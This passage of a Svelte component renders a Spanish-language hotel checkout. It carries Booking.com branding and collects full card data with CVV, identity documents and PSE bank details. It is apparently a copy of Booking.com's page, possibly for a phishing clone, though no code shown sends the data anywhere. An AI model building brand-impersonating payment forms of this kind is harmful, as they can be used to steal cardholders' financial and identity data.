							class="flex flex-col items-center p-4 border rounded-lg transition-colors {currentPaymentMethod === 'pse' ? 'bg-blue-100 border-blue-500 text-blue-700' : 'hover:bg-gray-50 border-gray-300'}"
						>
							<svg class="w-8 h-8 mb-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
								<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 21V5a2 2 0 00-2-2H7a2 2 0 00-2 2v16m14 0h2m-2 0h-5m-9 0H3m2 0h5M9 7h1m-1 4h1m4-4h1m-1 4h1m-5 10v-5a1 1 0 011-1h2a1 1 0 011 1v5m-4 0h4"/>
							</svg>
							<span class="text-sm font-semibold">PSE</span>
						</button>
					</div>
				</div>

				<div class="bg-white rounded-lg border border-gray-200 p-6">
					<h3 class="text-xl font-bold text-gray-900 mb-4">Paga cuando te alojes</h3>
					<div class="flex gap-3">
						<svg class="w-6 h-6 text-blue-600 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
							<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"/>
						</svg>
						<p class="text-sm text-gray-900">El alojamiento gestionará el pago. La fecha del cobro dependerá de las condiciones de tu reserva.</p>
					</div>
				</div>

				{#if currentPaymentMethod === 'credit-debit'}
				<div class="bg-white rounded-lg border border-gray-200 p-6">
					<h3 class="text-xl font-bold text-gray-900 mb-4">¿Cómo quieres pagar?</h3>
					
					<div class="flex gap-3 mb-6">
						<img src="/assets/payment/cards.png" alt="" class="h-8">
					</div>

					<div class="space-y-4">
					<div>
					<label for="card-name" class="block text-sm font-medium text-gray-900 mb-2">Nombre del titular de la tarjeta <span class="text-red-600">*</span></label>
						<input 
							id="card-name" 
							type="text" 
							bind:value={paymentData.cardName}
							on:input={(e) => handlePaymentInputEvent(e, 'cardName')}
							placeholder="Juan Pérez" 
							class="w-full px-3 py-2 border rounded focus:outline-none focus:ring-2 focus:ring-blue-500 {paymentErrors.cardName ? 'border-red-500' : 'border-gray-300'}"
						>
						{#if paymentErrors.cardName}
							<p class="text-xs text-red-600 mt-1">{paymentErrors.cardName}</p>
						{/if}
					</div>

				<div>
					<label for="document-id" class="block text-sm font-medium text-gray-900 mb-2">Documento de identidad <span class="text-red-600">*</span></label>
					<input 
						id="document-id" 
						type="text" 
						bind:value={paymentData.documentId}
						on:input={(e) => handlePaymentInputEvent(e, 'documentId')}
						placeholder="CC 123456789" 
						class="w-full px-3 py-2 border rounded focus:outline-none focus:ring-2 focus:ring-blue-500 {paymentErrors.documentId ? 'border-red-500' : 'border-gray-300'}"
					>
					{#if paymentErrors.documentId}
						<p class="text-xs text-red-600 mt-1">{paymentErrors.documentId}</p>
					{/if}
				</div>

					<div>
						<label for="card-number" class="block text-sm font-medium text-gray-900 mb-2">Número de la tarjeta <span class="text-red-600">*</span></label>
						<div class="relative">
							<input 
								id="card-number" 
								type="text" 
								bind:value={paymentData.cardNumber}
								on:input={(e) => handlePaymentInputEvent(e, 'cardNumber')}
								on:blur={handleCardNumberBlur}
								placeholder="1234 5678 9012 3456"
								class="w-full px-3 py-2 pl-10 border rounded focus:outline-none focus:ring-2 focus:ring-blue-500 {paymentErrors.cardNumber ? 'border-red-500' : 'border-gray-300'}"
							>
							<svg class="w-5 h-5 text-gray-400 absolute left-3 top-1/2 transform -translate-y-1/2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
								<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"/>
							</svg>
						</div>
						{#if paymentErrors.cardNumber}
							<p class="text-xs text-red-600 mt-1">{paymentErrors.cardNumber}</p>
						{/if}
					</div>

					<div class="w-48">
						<label for="card-expiry" class="block text-sm font-medium text-gray-900 mb-2">Fecha de caducidad <span class="text-red-600">*</span></label>
						<input 
							id="card-expiry" 
							type="text" 
							bind:value={paymentData.cardExpiry}
							on:input={(e) => handlePaymentInputEvent(e, 'cardExpiry')}
							placeholder="MM/AA" 
							class="w-full px-3 py-2 border rounded focus:outline-none focus:ring-2 focus:ring-blue-500 {paymentErrors.cardExpiry ? 'border-red-500' : 'border-gray-300'}"
						>
						{#if paymentErrors.cardExpiry}
							<p class="text-xs text-red-600 mt-1">{paymentErrors.cardExpiry}</p>
						{/if}
					</div>

					<div class="w-32">
						<label for="card-cvv" class="block text-sm font-medium text-gray-900 mb-2">CVV <span class="text-red-600">*</span></label>
						<input 
							id="card-cvv" 
							type="text" 
							bind:value={paymentData.cardCvv}
							on:input={(e) => handlePaymentInputEvent(e, 'cardCvv')}
							placeholder="123"
							class="w-full px-3 py-2 border rounded focus:outline-none focus:ring-2 focus:ring-blue-500 {paymentErrors.cardCvv ? 'border-red-500' : 'border-gray-300'}"
						>
						{#if paymentErrors.cardCvv}
							<p class="text-xs text-red-600 mt-1">{paymentErrors.cardCvv}</p>
						{/if}
					</div>
					</div>
				</div>
				{/if}

				{#if currentPaymentMethod === 'pse'}
				<div class="bg-white rounded-lg border border-gray-200 p-6">
					<h3 class="text-xl font-bold text-gray-900 mb-4">Pago con PSE</h3>
					
					<div class="flex gap-3 mb-6">
						<div class="flex items-center gap-2 px-3 py-2 bg-blue-50 rounded-lg">
							<svg class="w-6 h-6 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
								<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 21V5a2 2 0 00-2-2H7a2 2 0 00-2 2v16m14 0h2m-2 0h-5m-9 0H3m2 0h5M9 7h1m-1 4h1m4-4h1m-1 4h1m-5 10v-5a1 1 0 011-1h2a1 1 0 011 1v5m-4 0h4"/>
							</svg>
							<span class="text-sm font-semibold text-blue-700">PSE - Pago Seguro en Línea</span>
						</div>
					</div>

					<div class="space-y-4">
						<!-- Selección de banco -->
						<div>
							<label for="pse-bank" class="block text-sm font-medium text-gray-900 mb-2">Banco <span class="text-red-600">*</span></label>
							<select 
								id="pse-bank" 
								bind:value={pseData.bank}
								on:change={(e) => handlePseSelectEvent(e, 'bank')}
								class="w-full px-3 py-2 border rounded focus:outline-none focus:ring-2 focus:ring-blue-500 {pseErrors.bank ? 'border-red-500' : 'border-gray-300'}"
							>
								<option value="">Selecciona tu banco</option>
								<option value="bancolombia">BANCOLOMBIA</option>
								<option value="davivienda">DAVIVIENDA</option>
								<option value="nequi">NEQUI</option>
								<option value="bogota">BANCO DE BOGOTÁ</option>
							</select>
							{#if pseErrors.bank}
								<p class="text-xs text-red-600 mt-1">{pseErrors.bank}</p>
							{/if}
						</div>

						<!-- Tipo de persona -->
						<div>
							<label for="pse-person-type" class="block text-sm font-medium text-gray-900 mb-2">Tipo de persona <span class="text-red-600">*</span></label>
							<select 
								id="pse-person-type" 
								bind:value={pseData.personType}
								on:change={(e) => handlePseSelectEvent(e, 'personType')}
								class="w-full px-3 py-2 border rounded focus:outline-none focus:ring-2 focus:ring-blue-500 {pseErrors.personType ? 'border-red-500' : 'border-gray-300'}"
							>
								<option value="">Selecciona el tipo de persona</option>
								<option value="natural">Persona Natural</option>
								<option value="juridica">Persona Jurídica</option>
							</select>
							{#if pseErrors.personType}
								<p class="text-xs text-red-600 mt-1">{pseErrors.personType}</p>
							{/if}
						</div>

						<!-- Tipo y número de documento -->
						<div class="grid grid-cols-2 gap-4">
							<div>
								<label for="pse-doc-type" class="block text-sm font-medium text-gray-900 mb-2">Tipo de documento <span class="text-red-600">*</span></label>
								<select 
									id="pse-doc-type" 
									bind:value={pseData.docType}
									on:change={(e) => handlePseSelectEvent(e, 'docType')}
									class="w-full px-3 py-2 border rounded focus:outline-none focus:ring-2 focus:ring-blue-500 {pseErrors.docType ? 'border-red-500' : 'border-gray-300'}"
								>
									<option value="">Seleccionar</option>
									<option value="cc">Cédula de Ciudadanía</option>
									<option value="ce">Cédula de Extranjería</option>
									<option value="nit">NIT</option>
									<option value="ti">Tarjeta de Identidad</option>
									<option value="pasaporte">Pasaporte</option>
									<option value="cliente">Identificador único de cliente</option>
									<option value="linea">Número de línea móvil</option>
									<option value="rcn">Registro Civil de Nacimiento</option>
									<option value="extranjero">Documento de Identificación Extranjero</option>
								</select>
								{#if pseErrors.docType}
									<p class="text-xs text-red-600 mt-1">{pseErrors.docType}</p>
								{/if}
							</div>
							<div>
								<label for="pse-doc-number" class="block text-sm font-medium text-gray-900 mb-2">Número de documento <span class="text-red-600">*</span></label>
								<input 
									id="pse-doc-number" 
									type="text" 
									bind:value={pseData.docNumber}
									on:input={(e) => handlePseInputEvent(e, 'docNumber')}
									placeholder="123456789"
									class="w-full px-3 py-2 border rounded focus:outline-none focus:ring-2 focus:ring-blue-500 {pseErrors.docNumber ? 'border-red-500' : 'border-gray-300'}"
								>
								{#if pseErrors.docNumber}
									<p class="text-xs text-red-600 mt-1">{pseErrors.docNumber}</p>
								{/if}
							</div>
						</div>

						<!-- Nombre y apellido -->
						<div class="grid grid-cols-2 gap-4">
							<div>
								<label for="pse-name" class="block text-sm font-medium text-gray-900 mb-2">Nombre <span class="text-red-600">*</span></label>
								<input 
									id="pse-name" 
									type="text" 
									bind:value={pseData.name}
									on:input={(e) => handlePseInputEvent(e, 'name')}
									placeholder="Juan"
									class="w-full px-3 py-2 border rounded focus:outline-none focus:ring-2 focus:ring-blue-500 {pseErrors.name ? 'border-red-500' : 'border-gray-300'}"
								>
								{#if pseErrors.name}
									<p class="text-xs text-red-600 mt-1">{pseErrors.name}</p>
								{/if}
							</div>
							<div>
								<label for="pse-surname" class="block text-sm font-medium text-gray-900 mb-2">Apellido <span class="text-red-600">*</span></label>
								<input 
									id="pse-surname" 
									type="text" 
									bind:value={pseData.surname}
									on:input={(e) => handlePseInputEvent(e, 'surname')}
									placeholder="Pérez"
									class="w-full px-3 py-2 border rounded focus:outline-none focus:ring-2 focus:ring-blue-500 {pseErrors.surname ? 'border-red-500' : 'border-gray-300'}"
								>
								{#if pseErrors.surname}
									<p class="text-xs text-red-600 mt-1">{pseErrors.surname}</p>
								{/if}
							</div>
						</div>

						<!-- Email y teléfono -->
						<div class="grid grid-cols-2 gap-4">
							<div>
								<label for="pse-email" class="block text-sm font-medium text-gray-900 mb-2">Email <span class="text-red-600">*</span></label>
								<input 
									id="pse-email" 
									type="email" 
									bind:value={pseData.email}
									on:input={(e) => handlePseInputEvent(e, 'email')}
									placeholder="juan@ejemplo.com"
									class="w-full px-3 py-2 border rounded focus:outline-none focus:ring-2 focus:ring-blue-500 {pseErrors.email ? 'border-red-500' : 'border-gray-300'}"
								>
								{#if pseErrors.email}
									<p class="text-xs text-red-600 mt-1">{pseErrors.email}</p>
								{/if}
							</div>
							<div>
								<label for="pse-phone" class="block text-sm font-medium text-gray-900 mb-2">Teléfono <span class="text-red-600">*</span></label>
								<input 
									id="pse-phone" 
									type="tel" 
									bind:value={pseData.phone}
									on:input={(e) => handlePseInputEvent(e, 'phone')}
									placeholder="3001234567"
									class="w-full px-3 py-2 border rounded focus:outline-none focus:ring-2 focus:ring-blue-500 {pseErrors.phone ? 'border-red-500' : 'border-gray-300'}"
								>
								{#if pseErrors.phone}
									<p class="text-xs text-red-600 mt-1">{pseErrors.phone}</p>
								{/if}
							</div>
						</div>

						<!-- Ciudad y dirección -->
						<div>
							<label for="pse-city" class="block text-sm font-medium text-gray-900 mb-2">Ciudad <span class="text-red-600">*</span></label>
							<input 
								id="pse-city" 
								type="text" 
								bind:value={pseData.city}
								on:input={(e) => handlePseInputEvent(e, 'city')}
								placeholder="Bogotá"
								class="w-full px-3 py-2 border rounded focus:outline-none focus:ring-2 focus:ring-blue-500 {pseErrors.city ? 'border-red-500' : 'border-gray-300'}"
							>
							{#if pseErrors.city}
								<p class="text-xs text-red-600 mt-1">{pseErrors.city}</p>
							{/if}
						</div>

						<div>
							<label for="pse-address" class="block text-sm font-medium text-gray-900 mb-2">Dirección <span class="text-red-600">*</span></label>
							<input 
								id="pse-address" 
								type="text" 
								bind:value={pseData.address}
								on:input={(e) => handlePseInputEvent(e, 'address')}
								placeholder="Calle 123 #45-67"
								class="w-full px-3 py-2 border rounded focus:outline-none focus:ring-2 focus:ring-blue-500 {pseErrors.address ? 'border-red-500' : 'border-gray-300'}"
							>
							{#if pseErrors.address}
								<p class="text-xs text-red-600 mt-1">{pseErrors.address}</p>
							{/if}
						</div>
					</div>
				</div>
				{/if}

				<div class="bg-white rounded-lg border border-gray-200 p-6">
					<h3 class="text-xl font-bold text-gray-900 mb-4">Necesario para completar la reserva</h3>
					
					<div class="space-y-4">
						<label class="flex items-start gap-3">
							<input 
								type="checkbox" 
								bind:checked={paymentData.acceptPrivacy}
								on:change={(e) => handlePaymentCheckboxEvent(e, 'acceptPrivacy')}
								class="w-5 h-5 text-blue-600 border-gray-300 rounded focus:ring-blue-500 mt-0.5 flex-shrink-0 {paymentErrors.acceptPrivacy ? 'border-red-500' : ''}"
							>
							<div class="text-sm">
								<span class="text-gray-900">Acepto que mis datos se recopilen y se procesen de acuerdo con la <a href="/privacy" class="text-blue-600 hover:underline">Política de privacidad</a> <span class="text-red-600">*</span></span>
								<p class="text-gray-600 mt-1">Para más información, consulta nuestra <a href="/privacy" class="text-blue-600 hover:underline">Política de privacidad</a>.</p>
								{#if paymentErrors.acceptPrivacy}
									<p class="text-xs text-red-600 mt-1">{paymentErrors.acceptPrivacy}</p>
								{/if}
							</div>
						</label>

						<label class="flex items-start gap-3">
							<input 
								type="checkbox" 
								bind:checked={paymentData.acceptMarketing}
								on:change={(e) => handlePaymentCheckboxEvent(e, 'acceptMarketing')}
								class="w-5 h-5 text-blue-600 border-gray-300 rounded focus:ring-blue-500 mt-0.5 flex-shrink-0"
							>
							<div class="text-sm">
								<span class="text-gray-900">Acepto recibir emails de marketing de Booking.com con promociones, recomendaciones personalizadas, premios, experiencias de viaje y novedades sobre los productos y servicios de Booking.com.</span>
								<p class="text-gray-600 mt-2">Al suscribirte, nos permites adaptar las ofertas y el contenido a tus intereses monitorizando cómo usas Booking.com a través de tecnologías de seguimiento. Puedes darte de baja en cualquier momento a través del enlace de tu cuenta o en el enlace que aparece en el email de marketing. Lee nuestra <a href="/privacy" class="text-blue-600 hover:underline">política de privacidad</a>.</p>
							</div>
						</label>

						<div class="pt-4 border-t text-sm text-gray-700">
							<p class="mb-2">Tu reserva se ha hecho directamente con Holiday Inn Express Yopal by IHG y al completarla aceptas las <a href="/terms" class="text-blue-600 hover:underline">condiciones de la reserva</a>, las <a href="/terms" class="text-blue-600 hover:underline">condiciones generales</a>, la <a href="/privacy" class="text-blue-600 hover:underline">política de privacidad</a> y los <a href="/wallet-terms" class="text-blue-600 hover:underline">términos del Monedero</a>.</p>
						</div>
					</div>
				</div>

				<div class="flex flex-col items-end gap-3 pt-4">
					<button 
						on:click={handleCompleteReservation}
						disabled={isSubmitting || (currentPaymentMethod === 'credit-debit' ? !isPaymentValid : (!isPseValid || !paymentData.acceptPrivacy))}
						class="bg-blue-600 hover:bg-blue-700 disabled:bg-gray-400 disabled:cursor-not-allowed text-white font-semibold px-8 py-4 rounded text-lg w-full md:w-auto transition-colors"
					>
						{#if isSubmitting}
							<div class="flex items-center gap-2">
								<div class="animate-spin rounded-full h-4 w-4 border-b-2 border-white"></div>
								{#if currentPaymentMethod === 'pse'}
									Procesando pago PSE...
								{:else}
									Procesando pago...
								{/if}
							</div>
						{:else if currentPaymentMethod === 'credit-debit' && !isPaymentValid}
							Completa los datos de la tarjeta
						{:else if currentPaymentMethod === 'pse' && (!isPseValid || !paymentData.acceptPrivacy)}
							Completa los datos PSE y acepta los términos
						{:else if currentPaymentMethod === 'pse'}
							Continuar con PSE
						{:else}
							Completa la reserva
						{/if}
					</button>
					<a href="/reservation-conditions" class="text-sm text-blue-600 hover:underline">¿Cuáles son las condiciones de mi reserva?</a>
				</div>
			</div>
		</div>
		{/if}
	</div>
</main>

<Footer />
